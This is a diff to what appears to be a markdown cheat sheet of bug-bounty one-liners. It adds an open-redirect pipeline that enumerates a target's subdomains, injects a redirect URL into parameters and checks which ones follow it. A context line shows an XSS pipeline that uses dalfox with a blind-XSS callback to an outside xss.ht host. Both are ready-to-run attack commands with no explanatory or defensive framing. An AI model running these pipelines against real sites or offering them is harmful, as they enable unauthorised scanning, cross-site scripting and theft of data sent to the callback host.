@@ -11,3 +11,9 @@ cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv "\.(jpg|jpeg|gif|
 ```
 assetfinder -subs-only domain.com | waybackurls | grep "=" | kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe -b https://syarifsajjad.xss.ht/
 ```
+
+## OPEN REDIRECT ONE LINER
+
+```
+subfinder -all -d target.com -silent | waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
+```
